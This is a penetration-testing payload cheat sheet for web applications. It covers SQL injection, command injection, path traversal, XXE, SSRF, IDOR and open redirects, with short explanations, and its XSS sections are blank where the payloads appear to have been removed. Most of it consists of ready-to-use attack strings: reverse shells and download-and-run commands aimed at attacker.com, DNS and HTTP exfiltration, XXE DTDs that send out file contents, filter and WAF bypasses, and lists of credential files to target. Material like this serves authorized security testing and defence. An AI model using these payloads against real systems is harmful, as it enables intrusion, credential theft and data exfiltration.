content:
SQL Injection - Authentication Bypass Payloads:
- ' OR '1'='1' --
- ' OR '1'='1' /*
- admin' --
- ' OR 1=1 #
- ' UNION SELECT NULL, username, password FROM users --
- ') OR ('1'='1
- ' OR ''='
- 1' OR '1' = '1

These payloads exploit string concatenation in SQL queries. The single quote closes the original string context, then OR 1=1 makes the WHERE clause always true. The comment characters (-- or #) neutralize the rest of the query.

SQL Injection - UNION-Based Data Extraction:
- ' UNION SELECT NULL --
- ' UNION SELECT NULL, NULL --
- ' UNION SELECT username, password FROM users --
- ' UNION SELECT table_name, NULL FROM information_schema.tables --
- ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
- 0 UNION SELECT ALL FROM users WHERE 1=1 --

UNION attacks append additional SELECT results. First determine column count by adding NULL columns. Then extract data from other tables. The information_schema tables reveal database structure.

SQL Injection - Blind Boolean-Based:
- ' AND 1=1 -- (returns normal page)
- ' AND 1=2 -- (returns different/error page)
- ' AND (SELECT COUNT(*) FROM users) > 0 --
- ' AND SUBSTRING(username,1,1)='a' FROM users WHERE id=1 --
- ' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64 --

Blind SQLi extracts data one bit at a time by observing page differences. Boolean-based checks if conditions are true/false. Use binary search on ASCII values to extract characters efficiently.

SQL Injection - Time-Based Blind:
- ' AND SLEEP(5) --
- ' OR IF(1=1, SLEEP(5), 0) --
- '; WAITFOR DELAY '0:0:5' --
- ' AND (SELECT * FROM (SELECT SLEEP(5))t) --
- ' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5)) --

Time-based blind SQLi uses database sleep functions to infer data. If the response is delayed, the condition was true. Works when no visible output difference exists. MySQL uses SLEEP(), MSSQL uses WAITFOR DELAY, PostgreSQL uses pg_sleep().

SQL Injection - WAF/Filter Bypass Techniques:
- Case alternation: sElEcT, UnIoN
- Whitespace alternatives: UNION/**/SELECT, UNION%0aSELECT
- URL encoding: %27 (single quote), %23 (#), %2D%2D (--)
- Double URL encoding: %2527
- Null byte: %00' OR 1=1
- Inline comments: /*!UNION*/ /*!SELECT*/
- Concat: CONCAT(0x27, 0x4F52, 0x27)
- Hex encoding: 0x61646d696e (admin)

When basic payloads are blocked, encoding and obfuscation can bypass WAF rules. Try each technique systematically.

XSS - Reflected XSS Payloads: - - - - - -
-
XSS - Filter Bypass Techniques: - Case variations: - No quotes: - Template literals: - Event handlers without script tag: - JavaScript protocol: click - Data URI:

XSS - Stored/Persistent XSS: - Target user-generated content fields: comments, profile bios, usernames, messages - Payloads persist in database and execute for every viewer - - Stored XSS is more dangerous than reflected because it affects all users viewing the content. Target any field that gets stored and displayed to other users. Cookie stealing, keylogging, and session hijacking are common exploitation goals.

Command Injection - Shell Metacharacter Payloads:
- ; ls -la
- | cat /etc/passwd
- `whoami`
- $(id)
- && cat /etc/shadow
- || curl http://attacker.com/$(whoami)
- ; nc -e /bin/sh attacker.com 4444
- %0a id
- $IFS instead of spaces: cat${IFS}/etc/passwd
- Newline injection: %0aid

Command injection uses shell metacharacters to append or chain commands. Semicolons (;) separate commands. Pipes (|) redirect output. Backticks and $() enable command substitution. Double ampersand (&&) chains on success.

Command Injection - Blind/Out-of-Band:
- ; sleep 10 (time-based detection)
- | ping -c 10 attacker.com (network-based detection)
- ; curl http://attacker.com/$(whoami) (data exfiltration)
- ; nslookup $(cat /etc/hostname).attacker.com (DNS exfiltration)
- ; wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh

When command output is not visible, use time delays (sleep), network callbacks (curl/ping/nslookup to attacker-controlled server), or DNS exfiltration to confirm injection. DNS exfiltration embeds data in subdomain queries.

Command Injection - Filter Bypass:
- Concatenation: c'a't /etc/passwd
- Wildcards: cat /etc/pass??
- Environment variables: $HOME, $PATH
- Base64 encoding: echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash
- Hex: echo -e '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | bash
- Tab instead of space: ;cat\t/etc/passwd
- Brace expansion: {cat,/etc/passwd}

When blacklists filter common commands, use shell expansion, encoding, or alternative syntax to bypass restrictions.

Path Traversal - Basic Payloads:
- ../../../etc/passwd
- ....//....//....//etc/passwd
- ..\..\..\windows\system32\config\sam
- %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
- ..%252f..%252f..%252fetc%252fpasswd (double encoding)
- %c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd (overlong UTF-8)
- /var/www/../../etc/passwd

Path traversal escapes the intended directory using ../ sequences. When basic ../ is blocked: try URL encoding, double encoding, overlong UTF-8, null bytes, or OS-specific separators (backslash on Windows).

Path Traversal - Interesting Target Files:
- Linux: /etc/passwd, /etc/shadow, /etc/hosts, /proc/self/environ, /root/.ssh/id_rsa, /root/.bash_history
- Application: ../../config.yml, ../../.env, ../../database.sqlite, ../../wp-config.php
- Cloud: /proc/self/environ (may contain AWS keys), /var/run/secrets/kubernetes.io/serviceaccount/token

Once path traversal is confirmed, target high-value files: credentials, configuration, SSH keys, cloud metadata tokens. /proc/self/environ often contains environment variables with API keys.

XXE - XML External Entity Payloads:
- <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
- <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><data>&xxe;</data>
- <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>

XXE exploits XML parsers that process external entity declarations. SYSTEM entities can read local files or make HTTP requests. PHP filter wrappers can base64-encode binary files. Disable external entities (resolve_entities=False) to prevent.

XXE - Blind/Out-of-Band:
- <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]> (detect via HTTP callback)
- <!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]> (external DTD)
- evil.dtd: <!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % payload "<!ENTITY % exfil SYSTEM 'http://attacker.com/?d=%data;'>">%payload;%exfil;

Blind XXE uses out-of-band channels (HTTP/DNS) to exfiltrate data. Host a malicious DTD on attacker server. The DTD reads local files and sends content via HTTP parameter. Works even when XML response is not displayed.

SSRF - Server-Side Request Forgery Payloads:
- http://localhost:80 (local web server)
- http://127.0.0.1:22 (SSH port scan)
- http://169.254.169.254/latest/meta-data/ (AWS metadata)
- http://metadata.google.internal/computeMetadata/v1/ (GCP metadata)
- http://169.254.169.254/metadata/v1.json (DigitalOcean)
- http://[::]:80 (IPv6 localhost)
- http://0.0.0.0:80
- http://0177.0.0.1 (octal localhost)
- http://2130706433 (decimal localhost)

SSRF makes the server issue requests to internal/cloud resources. Cloud metadata endpoints expose IAM credentials. Use IP format variations to bypass naive localhost checks.

SSRF - Filter Bypass Techniques:
- URL shorteners: https://tinyurl.com/internal-redirect
- DNS rebinding: Register domain that resolves to 127.0.0.1
- Open redirect chains: http://allowed.com/redirect?url=http://localhost
- Decimal IP: http://2130706433 (127.0.0.1 as integer)
- IPv6: http://[::ffff:127.0.0.1]
- Enclosed alphanumeric: http://127。0。0。1 (fullwidth dot)
- URL parsing confusion: http://attacker.com@127.0.0.1
- Protocol smuggling: gopher://localhost:25/

When URL validation blocks obvious patterns, try alternative IP representations, protocol handlers, URL parsing ambiguities, and redirect chains.

IDOR - Insecure Direct Object Reference:
- Change user_id parameter: /api/users/123 → /api/users/124
- Increment resource IDs: /api/orders/1001 → /api/orders/1002
- UUID guessing: Try sequential or predictable UUIDs
- Parameter pollution: /api/users?id=123&id=456
- HTTP method switching: GET /api/users/123 works, try DELETE /api/users/456

IDOR occurs when the application uses user-supplied identifiers to access objects without authorization checks. Test by creating two accounts and trying to access each other's resources. Check all CRUD endpoints. APIs with numeric sequential IDs are most vulnerable.

Open Redirect Payloads:
- //evil.com
- /\evil.com
- https://evil.com
- //evil%2Ecom
- ///evil.com/%2F..
- //evil.com/%2e%2e
- ?next=http://evil.com
- ?redirect=//evil.com
- ?url=https://evil.com@legitimate.com
- javascript:alert(1)//

Open redirect occurs when the application redirects to user-controlled URLs without validation. Used in phishing (redirect from trusted domain to attacker site) and OAuth token theft. Bypass domain checks with URL parsing confusion, double slashes, and @ symbols.
